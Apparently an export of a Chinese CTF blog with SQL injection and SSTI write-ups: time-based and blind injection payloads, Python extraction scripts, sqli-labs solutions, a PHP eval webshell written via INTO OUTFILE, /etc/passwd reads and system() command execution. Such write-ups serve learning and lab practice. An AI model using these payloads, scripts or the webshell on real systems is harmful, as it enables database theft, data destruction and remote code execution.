前言完整的学习四种时间注入的方式，分别是sleep(),benchmark(),笛卡尔积,get_lock&gt;。","text":"0x00 前言完整的学习四种时间注入的方式，分别是sleep(),benchmark(),笛卡尔积,get_lock&gt;。 0x01 sleep()最常见的时间注入方式，sleep(n)让语句运行n秒中。配合if语句 …if(1,sleep(3),0)…或者select case when 语句。不做深入研究。1234567mysql&gt; select sleep(3);+----------+| sleep(3) |+----------+| 0 |+----------+1 row in set (3.00 sec) 0x02 BENCHMARK()BENCHMARK函数执行某函数的次数BENCHMARK(n,SHA1(‘asd’))n=次数，代表执行SHA1(‘asd’)n次，当n到达一定程度时会造成和sleep()一样的效果123456789101112131415mysql&gt; select BENCHMARK(10000000,SHA1('1'));+-------------------------------+| BENCHMARK(1000000,SHA1('1')) |+-------------------------------+| 0 |+-------------------------------+1 row in set (0.24 sec)mysql&gt; select BENCHMARK(10000000,SHA1('1'));+-------------------------------+| BENCHMARK(10000000,SHA1('1')) |+-------------------------------+| 0 |+-------------------------------+1 row in set (2.44 sec) 0x03 笛卡尔积通过对一张表作自身的笛卡尔积让查询时间变长从而达到和sleep一样的效果这里用information_schema.columns表做笛卡儿积123456789101112131415mysql&gt; select count(*) from information_schema.columns; //+----------+| count(*) |+----------+| 3095 |+----------+1 row in set (0.05 sec)mysql&gt; select count(*) from information_schema.columns ,information_schema.columns qwe;+----------+| count(*) |+----------+| 9579025 |+----------+1 row in set (0.38 sec) 可以看到做一次笛卡儿积后时间翻了很多倍。1mysql&gt; select count(*) from information_schema.columns ,information_schema.columns qwe ,information_schema.columns wer; 两次笛卡儿积可以直接把数据库打挂。 0x04 get_lockGET_LOCK(str,timeout);先锁定一个变量 : GET_LOCK(‘altman’,1)再使用另一个session执行函数 : GET_LOCK(‘altman’,5)会产生一个5秒的停滞。本地测试一下。1234567891011121314151617mysql&gt; select GET_LOCK('qwe',1);+-------------------+| GET_LOCK('qwe',1) |+-------------------+| 1 |+-------------------+1 row in set (0.00 sec)//再打开另一个MYSQL命令行mysql&gt; select get_lock('qwe',5);+-------------------+| get_lock('qwe',5) |+-------------------+| 0 |+-------------------+1 row in set (5.00 sec) 造成的与sleep(5)相同的效果 0x05实战pwnhub上的sql题。给出了源码。123456789101112131415&lt;?phprequire 'conn.php';$id = $_GET['id'];if(preg_match(\"/(sleep|benchmark|outfile|dumpfile|load_file|join)/i\", $_GET['id']))&#123; die(\"you bad bad!\");&#125;$sql = \"select * from article where id='\".intval($id).\"'\";$res = mysql_query($sql);if(!$res)&#123; die(\"404 not found!\");&#125;$row = mysql_fetch_array($res, MYSQL_ASSOC);mysql_query(\"update view set view_times=view_times+1 where id = '\".$id.\" '\");?&gt; 注入点很明显的时间盲注1mysql_query(\"update view set view_times=view_times+1 where id = '\".$id.\" '\"); 但是sleep,BENCHMARK被正则了 这里分别用 笛卡儿积，get_lock三种方法尝试。 笛卡儿积先尝试payload:1id=%27or%20(select%20if(1,(select%20count(*)%20from%20information_schema.columns,%20information_schema.columns%20T1,%20information_schema.columns%20T2,%20information_schema.columns%20T3),0))%23 成功造成停滞 ok ！接下来写python脚本1234567891011121314151617# encoding=utf-8import requestsimport stringurl = 'http://219.219.61.234:20262/article.php?id='flag = ''for i in range(1, 50): for j in string.letters+'123456789'+'&#123;&#125;!@#$%^&amp;*()_': url1 = url + \"' or (select if(((select ascii(substr(group_concat(table_name),\" + str(i) + \",1)) from information_schema.tables where table_schema=database() )='\" + str(ord(str(j))) + \"'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23\" #url1 = url + \"' or (select if(((select ascii(substr(group_concat(column_name),\" + str(i) + \",1)) from information_schema.columns where table_schema=database() and table_name='flag')='\" + str(ord(str(j))) + \"'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23\" #url1 = url + \"' or (select if(((select ascii(substr(flag,\" + str(i) + \",1)) from flag)='\" + str(ord(str(j))) + \"'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23\" try: r = requests.get(url1, timeout=2) except: flag += str(j) break print flag get_lock先注入1id=%27%20or%20get_lock(%27altman%27,1)%23 然后更换IP访问或者等一会之后访问从而使得MYSQL的session改变1id=%27%20or%20get_lock(%27altman%27,5)%23 成功造成5s延迟。接下来运行python脚本123456789101112131415# encoding=utf-8import requestsimport stringurl = 'http://219.219.61.234:20262/article.php?id='flag = ''for i in range(1, 50): for j in string.letters+'123456789'+'&#123;&#125;!@#$%^&amp;*()_': url1 = url + \"' or (select if(((select ascii(substr(flag,\" + str(i) + \",1)) from flag)='\" + str(ord(str(j))) + \"'),(get_lock('altman',7)),1))%23\" try: r = requests.get(url1, timeout=3) except: flag += str(j) break print flag","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"实验吧几道注入题","slug":"实验吧几道注入题","date":"2018-03-08T05:06:57.000Z","updated":"2018-11-02T05:50:01.442Z","comments":true,"path":"2018/03/08/实验吧几道注入题/","link":"","permalink":"http://altman.vip/2018/03/08/实验吧几道注入题/","excerpt":"0x1 加了料的报错注入url=http://ctf5.shiyanbar.com/web/baocuo/index.php提示了是报错注入，进行了一波FUZZ:username过滤了 =#-()","text":"0x1 加了料的报错注入url=http://ctf5.shiyanbar.com/web/baocuo/index.php提示了是报错注入，进行了一波FUZZ:username过滤了 =#-()password过滤了所有报错函数名 ExtractValue、UpdateXml等,substr mid left right union limit like。再结合提示的sql语句：1$sql=\"select * from users where username='$username' and password='$password'\" 我们可以将函数名放在username，()放在password里，构造：1username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or ' 这样sql语句就变成了1$sql=\"select * from users where username='' or updatexml/*' and password='*/(1,concat(0x3a,(select user())),1) or ''\" 注释掉了中间的内容并且绕过了waf。因为过滤了like和= ，这里用regexp代替12345username=' or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or ' //ffll44jj,usersusername=' or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj'),0x7e),1) or ' //valueusername=' or updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(value) from ffll44jj),0x7e),1) or ' //flag&#123;err0r_b4sed_sqli_+_hpf&#125; 另外 看了Pcat大佬的WP，发现password处EXP没有过滤，可以直接在password处注入123username=&amp;password='or exp(~(select*from(select user())x)) or 'username=&amp;password='or exp(~(select*from(select group_concat(value) from ffll44jj)x)) or ' 0x2 认真一点url=http://ctf5.shiyanbar.com/web/earnest/index.php明显的BOOL盲注payload:1id=0'oorr'1'='1 过滤了一大堆东西用括号代替空格，双写or绕过，过滤了逗号，mid无法使用，只能用regexp倒叙匹配。python脚本:1234567891011121314151617import requestsimport stringurl = \"http://ctf5.shiyanbar.com/web/earnest/index.php\"flag=\"\"for i in range(1,30): for j in string.letters+\"0123456789\"+\"!@#^&amp;()&#123;&#125;=+`~_,/.\": #payload=\"0'oorr(select(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))regexp('%s$'))oorr'1'='\" //fiaguser #payload=\"0'oorr(select(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='fiag')regexp('%s$'))oorr'1'='\" //fl$4g payload=\"0'oorr(select(select(fl$4g)from(fiag))regexp('%s$'))oorr'1'='\"%(j+flag) data = &#123; \"id\":payload &#125; r =requests.post(url=url,data=data) if 'You are in' in r.content: flag = j+flag print flag break print i 将逗号放到最后因为逗号*和$是通配符，如果出现了这几个符号，就要猜他到底是什么了。。。还没想到更准确的方法。得出flag：flag{haha~you win!} 0x3 who are you首页显示IP，抓包修改XFF，果然ip是从XFF处取值。尝试1X-FORWARDED-FOR:' or sleep(5) or '1'='1 sleep成功，尝试时间盲注发现逗号被过滤了。那么用select case when最终payload1X-FORWARDED-FOR:' or (select case when (1) then sleep(5) end) or '1'='1 附上盲注脚本:123456789101112131415161718192021 # -*- coding: UTF-8 -*-import requestsimport stringurl = \"http://ctf5.shiyanbar.com/web/wonderkun/index.php\"#payload=\"' or+(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1\"#payload=\"' or+(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1\"payload = \"' or+(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) or '1'='1\"flag = \"\"for i in range(0,33): for j in string.letters+\"0123456789\"+\"!@#^&amp;()&#123;&#125;=+`~_,/.\": payload1 = payload%(i,j) header=&#123; \"X-Forwarded-For\":payload1 &#125; try: r = requests.get(url=url,timeout=4,headers=header) except: flag+=j print flag break print i","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"hgame-week4","slug":"hgame-week4","date":"2018-03-02T16:00:00.000Z","updated":"2018-11-02T05:48:50.230Z","comments":true,"path":"2018/03/03/hgame-week4/","link":"","permalink":"http://altman.vip/2018/03/03/hgame-week4/","excerpt":"HGAME的第四周，难度变大了，记录一下做题过程。","text":"HGAME的第四周，难度变大了，记录一下做题过程。 又双叒叕是SQLI提示在线编辑，很明显是index.php~源代码泄露。拿到文件:12345678910111213141516171819202122232425&lt;?php error_reporting(0); include(\"sql.php\"); $waf=\"/(union|group by|=|&gt;|&lt;|hex| |lower|strcmp|updatexml|xmlelement|extractvalue|concat|bin|sleep|mid\\(|substr|left|ascii|\\/\\*|\\*\\/)/i\"; if(isset($_GET['user']))&#123; if(preg_match_all($waf,$_GET['user'])!=0)&#123; $user=\"admin\"; &#125;else&#123; $user = str_replace(\"'\",\"\\'\",$_GET['user']); &#125; //echo $user.\"&lt;br&gt;\"; $sqli = new mysqli($host,$username,$passwd,$database); $sqli-&gt;set_charset(\"gbk\"); $query=\"select * from users where username='\".$user.\"'\"; $result = $sqli-&gt;query($query); //echo $sqli-&gt;error; $num=0; @$num = $result-&gt;num_rows; if($num&gt;0)&#123; while($row = $result-&gt;fetch_row())&#123; echo $row[0].\"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;\".$row[1].\"&amp;nbsp;&amp;nbsp;&amp;nbsp;\".$row[2].\"&lt;br&gt;\"; &#125; &#125; &#125; 注意到GBK，尝试GBK注入。过滤了空格 用%0a代替1http://118.25.18.223:10088/?user=%df%27or%0a1%0alike%0a1%23 过滤了Union，没有报错。只能尝试盲注。由于没有过滤like，用%通配符就行爆破。贴python脚本:123456789101112131415161718import requestsimport stringurl = \"http://118.25.18.223:10088/?user=\"flag = \"\"flag1 = \"\"for i in range(1,100): for j in string.letters+\"0123456789\"+\"!@#$^&amp;*()&#123;&#125;=+`~_\": #payload = \"%%df%%27%%0aor%%0a((select%%0adatabase())%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #payload = \"%%df%%27%%0aor%%0a((select%%0aTABLE_NAME%%0afrom%%0ainformation_schema.TABLES%%0awhere%%0aTABLE_SCHEMA%%0alike%%0adatabase()limit%%0a0,1)%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #payload = \"%%df%%27%%0aor%%0a((select%%0aCOLUMN_NAME%%0afrom%%0ainformation_schema.COLUMNS%%0awhere%%0aTABLE_NAME%%0alike%%0a0x666c6c6c6c6c6167%%0alimit%%0a2,1)%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) payload = \"%%df%%27%%0aor%%0a((select%%0athisisflag%%0afrom%%0aflllllag)%%0alike%%0a0x%s25)%%23\"%(flag+hex(ord(j))[2:]) url1=url+payload r =requests.get(url=url1) if 'chutiren' in r.content: flag += hex(ord(j))[2:] flag1 += j print flag1 break 散落的flagflag被分为了三段第一段在注册页面，抓包发送后可以拿到验证码。注册成功后登陆，看到第一段flag。123456User Infoaltmanusername: altmansecret: hgame&#123;0102940de1 然后寻找第二段fla重新登陆注册的账号，抓包发现check_user.php修改username=admin出现第二段flag1234567User Infoaltmanusername: adminsecret: 10c546b2cf68 然后修改密码，抓包后改username为admin然后登陆admin拿到第三段flagcongratulation you get The last flag:|98924acfce}|(竖线内的内容为最后一段flag)拼接后得到flag 奇怪的SQLi600分的题有点吓人。。SSRF攻击mysql当时没做出来，现在题目关了。有机会再补上。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"SSTI（服务端模板注入攻击 ）","slug":"SSTI","date":"2018-02-23T16:32:32.000Z","updated":"2018-11-02T05:46:43.125Z","comments":true,"path":"2018/02/24/SSTI/","link":"","permalink":"http://altman.vip/2018/02/24/SSTI/","excerpt":"源自HGAME-week3的一道题 NGC’S BLOG","text":"源自HGAME-week3的一道题 NGC’S BLOGurl:1http://111.230.105.104:5000/hello/ngc 学习一波ssti参考链接 http://www.freebuf.com/vuls/83999.html http://www.freebuf.com/articles/web/135953.html http://www.freebuf.com/articles/web/98928.html这道题解法:尝试SSTI注入:1http://111.230.105.104:5000/%7B%7B1+1%7D%7D 返回 2 。 说明存在注入 。1234http://111.230.105.104:5000/%7B%7B1+1%7D%7Dhttp://111.230.105.104:5000/%7B%7B''.__class__.__mro__%7D%7Dhttp://111.230.105.104:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()%20%7D%7Dhttp://111.230.105.104:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()%20%7D%7D //读文件 提示了flag在flag中1http://111.230.105.104:5000/%7B%7B%20''.__class__.__mro__[2].__subclasses__()[40]('./flag').read()%20%7D%7D","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs(less54-less65)","slug":"sqli-labs 4","date":"2018-02-09T17:14:43.000Z","updated":"2018-11-02T05:47:03.273Z","comments":true,"path":"2018/02/10/sqli-labs 4/","link":"","permalink":"http://altman.vip/2018/02/10/sqli-labs 4/","excerpt":"从这部分开始题目看起来都比较有趣这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。","text":"从这部分开始题目看起来都比较有趣这部分题都是有查询次数限制的，读了下源码，他的数据库信息都是随机的，如果超过了次数限制，整个表都会随机重置。 less-54尝试闭合 直接成功1234567?id=1' or 1=1 %23?id=1' order by 3 %23?id=1' order by 4 %23 //爆出字段?id=-1' union select 1,2,database() %23 //爆出库名?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23 //爆表?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6b6179736a6d316c6c6c) %23 //爆字段?id=-1' union select 1,2,(select group_concat(secret_IC58) from kaysjm1lll) %23 //爆flag 一共用了7次 爆出flag：Qn53kV6NaD4ffFR1BSA3sBkp（每次的数据库名表名字段名和flag都是不一样的） less-55和上面一样的套路，只是把单引号换成了括号payload:1?id=1) or 1=1 %23 less-56常规思路进行尝试 得到payload：1?id=1') or 1=1 %23 其他的就是常规暴库 less -57一样的套路 只不过变成了双引号1?id=1\" or 1=1 %23 less-58单引号闭合 报错注入1?id=1' or updatexml(1,concat(0x7e,database(),0x7e),1) %23 成功爆出库名。然后就是报错的常规操作了。 less-59没有符号闭合的报错注入 :1?id=1 or updatexml(1,concat(0x7e,database(),0x7e),1) %23 less-601?id=1\") or updatexml(1,concat(0x7e,database(),0x7e),1) %23 less-611?id=1')) or updatexml(1,concat(0x7e,database(),0x7e),1) %23 less-62130次的限制，盲注 。但是遇到了问题就是，盲注次数控制不了在130以内，这就很头疼。payload:1?id=1') and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 less-63只是换了闭合符号payload:1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 less -641?id=1)) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 less -651?id=1\") and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) &gt; 97 %23 总结终于做完了65关 ，看着很多，其实做起来很快。本来以前后面会比较难，其实很基础，重复的题目太多了。目前不懂得地方就是限制次数的盲注脚本。还没有想到什么好的办法，以后想到了会回来补上脚本的。OVER。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs (less39-less53)","slug":"sqli-labs 3","date":"2018-02-09T15:38:18.000Z","updated":"2018-11-02T05:51:40.526Z","comments":true,"path":"2018/02/09/sqli-labs 3/","link":"","permalink":"http://altman.vip/2018/02/09/sqli-labs 3/","excerpt":"less-39直接闭合:1?id=1 or 1=1 %23","text":"less-39直接闭合:1?id=1 or 1=1 %23 less-4039题的盲注 脚本:123456789101112#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-40/?id=1' and ascii(mid((select password from users where username='admin2' ),%d,1))=%d and '1'='1\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag break less-41依旧盲注,和上题一样，不需要单引号闭合。 less-42堆叠注入。 在;后构造新的语句造成执行。比如输入1usernma=123';create table haha like users; 在查询后执行创造表的指令。这道题堆叠注入的点在于password，用户名任意输，密码处构造注入1login_user=123&amp;login_password=123';create table hahah like users#&amp;mysubmit=Login 这时候去后台查表发现已经存在hahah表了。用样可以利用1login_user=123&amp;login_password=123';drop table hahah#&amp;mysubmit=Login 删除hahah表。这里我们用指令创造一个账号登陆payload:1login_user=123&amp;login_password=123';insert into users(id,username,password) values ('100','altman','altman')##&amp;mysubmit=Login 这个任意指令执行还是很危险的。 less-43和上题的区别就是需要加括号闭合。1login_user=123&amp;login_password=123');drop table hahah#&amp;mysubmit=Login less-44和42题没啥区别 less-45和43题没啥区别 想了想比赛应该不会出这种堆叠注入，过滤稍微不严格的话整个数据库就要被删掉。。。也可以直接getshell less-46基于错误的排序注入看了下源码:1$sql = \"SELECT * FROM users ORDER BY $id\"; 尝试：1?sort=updatexml(1,concat(0x7e,database(),0x7e),1) 成功 less-47增加了单引号闭合：1?sort=1' and updatexml(1,concat(0x7e, database(),0x7e),1) and '1'='1 less-48盲注 ，各种尝试后没有结果。去方方土博客看了看发现需要时间盲注 脚本:1234567891011121314# Author:sky# -*- coding: utf-8 -*-import requestsflag = ''url = 'http://localhost/sql/Less-48/?sort=1 and if(((ascii(substr((select password from users where username=\"admin2\"),%s,1)))=%d),sleep(2),false)'for x in range(1,100): for y in range(33,127): urll = url%(x,y) try: f = requests.get(url=urll,timeout=1.5) except: flag+=chr(y) print flag break less-4947题的盲注版本 一样用时间盲注 less-50排序注入后加了堆叠注入 Less-51同上题，需要引号闭合 Less-5250的盲注，同时间注入，脚本懒得写。。。 Less-5351的盲注，时间注入","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs (less23-less38)","slug":"sqli-labs 2","date":"2018-02-05T16:00:00.000Z","updated":"2018-11-02T05:51:50.421Z","comments":true,"path":"2018/02/06/sqli-labs 2/","link":"","permalink":"http://altman.vip/2018/02/06/sqli-labs 2/","excerpt":"less-231?id=1' or '1'=' 成功闭合payload：1?id=1' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or '1'='1","text":"less-231?id=1' or '1'=' 成功闭合payload：1?id=1' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or '1'='1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1' || updatexml(1,concat(0x7e,(select user()),0x7e),1)) or '1'='1 而且他只是过滤删去了or，可以重写绕过。 less-25a上题的基础下进行盲注入脚本如下：12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-25a/?id=-1 || ascii(mid((select passwoorrd from users where username='admin2'),%d,1))=%d\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag breakprint result less-26空格绕过 用()绕过空格就好了1?id=1'||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'1'='1 less-26a上一题的忙注版本12345678910import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-26a/?id=1'anandd(ascii(mid((select(passwoorrd)from(users)where(username='admin2')),%d,1))=%d)anandd'1'='1\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag break less-27过滤并不严格123456789101112$id= preg_replace('/[\\/\\*]/',\"\", $id); //strip out /*$id= preg_replace('/[--]/',\"\", $id); //Strip out --.$id= preg_replace('/[#]/',\"\", $id); //Strip out #.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/select/m',\"\", $id); //Strip out spaces.$id= preg_replace('/[ +]/',\"\", $id); //Strip out spaces.$id= preg_replace('/union/s',\"\", $id); //Strip out union$id= preg_replace('/select/s',\"\", $id); //Strip out select$id= preg_replace('/UNION/s',\"\", $id); //Strip out UNION$id= preg_replace('/SELECT/s',\"\", $id); //Strip out SELECT$id= preg_replace('/Union/s',\"\", $id); //Strip out Union$id= preg_replace('/Select/s',\"\", $id); //Strip out select 大小写绕过就行1?id=1'and(updatexml(1,concat(0x7e,(sEleCt(password)from(users)where(username='admin2')),0x7e),1))and'1'='1 less-27a依旧是27题的盲注，就不写了 less-28试了半天没回显 最后发现是个盲注 //不按套路走 不是加a才是盲注的吗= =脚本：123456789101112#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsflag = \"\"for i in range(1,100): for j in range(33,127): payload =\"http://localhost/sql/Less-28/?id=1')and(ascii(mid((sElEct(password)from(users)where(username='admin2')),%d,1))=%d)and('1'='1\"%(i,j) r= requests.get(url=payload) if \"Dumb\" in r.content: flag += chr(j) print flag break less-28a没看出来和28有啥区别 用28的脚本也能跑出来。。 less-29很轻松就饶过了。。我咋没看出来the best firewall在哪。。。？1?id=1' or updatexml(1,concat(0x7e,(select password from users where username='admin2'),0x7e),1) %23 看了源码 在login.php中，他会先将参数放入数组，然后读取语句的时候取数组第一个值，对id[1]进行过滤。但是如果我们传入两个id=1&amp;id=2，sql查询的时候会取第二个参数，这样就能绕过waf1?id=1&amp;id=-1' union select 1,2,3 %23 less-30上一题的盲注版本，脚本不写了 less-31和30题同解。。. less-32宽字节注入单引号前被加了反斜杠转义，无法正常闭合。但是如果使用了GBK编码，那么%df%5c会被认为是一个字，就可以使单引号逃逸。payload:1http://127.0.0.1/sql/Less-32/?id=1%df%27 or updatexml(1,concat(0x7e,user(),0x7e),1)%23 less-33和上题一样 less-34依旧是宽字节：1uname=1%df' or 1=1 %23&amp;passwd=1&amp;submit=Submit less-351http://127.0.0.1/sql/Less-35?id=1 or updatexml(1,concat(0x7e,user(),0x7e),1) %23 less-36还是宽字节1http://127.0.0.1/sql/Less-36?id=1%df' or updatexml(1,concat(0x7e,user(),0x7e),1) %23 看了下源码，这几个题的不同就在于加反斜杠用了好几种不同的函数。 less-37依旧是1uname=%df' or updatexml(1,concat(0x7e,(user()),0x7e),1)%23&amp;passwd=1&amp;submit=Submit less-38没看懂他的考点在哪，很轻易就注入成功12?id=1' or 1=1 %23?id=-1' union select 1,2,database()%23","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"sqli-labs (less1-less22)","slug":"sqli-labs 1","date":"2018-02-04T16:00:00.000Z","updated":"2018-11-02T05:48:06.083Z","comments":true,"path":"2018/02/05/sqli-labs 1/","link":"","permalink":"http://altman.vip/2018/02/05/sqli-labs 1/","excerpt":"用sqlilabs来练练注入环境很好配置 网上很多教程","text":"用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1' or 1=1 %23 爆字段：12?id=1' order by 3 %23?id=1' union select 1,2,3 %23 爆表名：1?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1%23 爆列名：1?id=-1' union select 1,2,column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1%23 查看用户名密码：1id=-1' union select 1,2,concat_ws(char(32,32,32),id,username,password) from users limit 0,1 %23 (后面只记录payload 暴库方法都差不多) less-2数字型1?id=1 or 1=1%23 less-3字符型单引号变形查询语句1Select login_name, select password from table where id= (‘id’) 用’)闭合1?id=1') or 1=1 %23 less-41?id=1\") or 1=1 %23 less-5单引号报错注入1?id=1'or 1=1 --+ payload1?id=1' union select count(*),1, concat(' ',(select user()), ' ',floor(rand()*2)) as b from information_schema.tables group by b%23 试了试其他的报错:123?id=1' or (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23?id=1' or (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23 都可以但是1?id=1' or exp(~(select * from (select database())a))%23 这个语句在wamp环境下爆不出来在lamp下就可以 没研究懂为啥。。。 less-61?id=1\" or 1=1 %23 less-7导出文件GET字符型注入 这个需要先找到根目录@@datadir 读取数据库路径@@basedir MYSQL 获取安装路径然后把查询结果导入到一个文件里 比如把一句话木马导入到php文件里payload:1id=1')) union select 1,'2','&lt;?php @eval($_POST[\"a\"]);?&gt;' into outfile 'E:\\\\wamp\\\\www\\\\sqli-labs\\\\a.php' %23 然后菜刀就OK less-8布尔盲注1?id=1' and ascii(substr((select database()),1,1))=115 %23 //数据库第一位是s ascii码是115 找到payload后写个脚本跑就可以了 less-9单引号时间盲注1?id=1' and if(ascii(substr(database(),1,1))=115,sleep(3),0 %23 less-10双引号时间盲注1?id=1\" and if(ascii(substr(database(),1,1))=115,sleep(3),0) %23 less-111uname=Dhakkan' or '1'='1 less-121username=Dhakkan\") or (\"1\")=(\"1 less-131admin') or ('1')=('1 less-141admin\" or \"1\"=\"1 less-151admin' or 1=1# less-161admin\") or 1=1# less-17在password处报错注入12uname=adminpasswd=' or (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23 less-18这关看了半天源码才会 先查数据库找到用户名密码登陆进去回显：1Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0 在UA头处进行注入 单引号尝试一下：1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '127.0.0.1', 'admin')' at line 1 然后试试报错注入1User-Agent:'or (extractvalue(1,concat(0x7e,(select user()),0x7e))) or '1'='1 成功爆出用户名 剩下的就是常规操作了 less-19只是把注入点换到了Referer头中，其他的完全一样 less-20登录后看到重点是在cookie里，加入单引号后报错尝试：1Cookie: uname='or (extractvalue(1,concat(0x7e,(select user()),0x7e))) or '1'='1 成功 其他的和上面一样 less-21只是在20题的基础上进行了base64编码1Cookie: uname=dW5hbWU9J29yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgJzEnPScx less-2220题的基础上，将单引号变成双引号1uname=dW5hbWU9Im9yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgIjEiPSIx less-23","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"hitctf-web","slug":"hitctf2018","date":"2018-02-02T16:00:00.000Z","updated":"2018-11-02T05:48:41.974Z","comments":true,"path":"2018/02/03/hitctf2018/","link":"","permalink":"http://altman.vip/2018/02/03/hitctf2018/","excerpt":"哈工大新生赛复现一波","text":"哈工大新生赛复现一波 PHPreading扫描目录发现源码备份index.php.bak123&lt;?php eval(base64_decode('JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw=='))?&gt; 解码后提交?asdfgjxzkallgj8852=H1TctF2018EzCTF拿到flag BabyEval给了源码1http://120.24.215.80:10013/?str=$&#123;phpinfo()&#125; 可以执行 那么久构造命令12http://120.24.215.80:10013/?str=$&#123;system($_GET[a])&#125;&amp;a=lshttp://120.24.215.80:10013/?str=$&#123;system($_GET[a])&#125;&amp;a=cat%20../../../162920976d9c04ac69e2f4392a8cffbf_flag.txt 或者这样也行1http://120.24.215.80:10013/?str=$&#123;var_dump(`ls`)&#125; BabyLeakage提示在/news/about尝试debug随便输入一个/news/admin 发现报错 给了很多目录尝试/news/auth/ 居然发现了mysql账户密码。。。？？？3306连接进去找到了flag BabyInjection方法一给了源码 发现他的waf基本让人无处下手123456789101112131415$query = \"SELECT * FROM users WHERE username='&#123;$username&#125;';\";echo $query.\"&lt;br&gt;\";$query = mysqli_query($conn, $query);if (mysqli_num_rows($query) == 1)&#123; $result = mysqli_fetch_array($query); if ($result['passwd'] == $passwd)&#123; die('you did it and this is your flag: '.$flag); &#125; else&#123; die('Wrong password'); &#125;&#125;else&#123; die('Wrong username');&#125; 只需要做到mysql根据username查询到的密码和我们的输入一样就可以了如果我们使用语句1select * from users where id=1 group by passwd with rollup with rollup会产生一个passwd值为NULL的行我们可以根据这点让他返回passwd=NULL的那一行用’=’’绕过用户名 构造语句1select * from users where username=''='' group by passwd with rollup limit 0,1 # 但是limit也不能用 我们可以用having最终payload1select * from users where username=''='' group by passwd with rollup having passwd is NULL # PASSWD交空就行了。 PS：这里没有想明白 select * from users where username=’’=’’ 中 username=’’=’’ 的逻辑问题本地进行了一波研究1select * from users where id=''='' 全表返回1234select * from users where id='0'=''select * from users where id=''='0'select * from users where id=''=0select * from users where 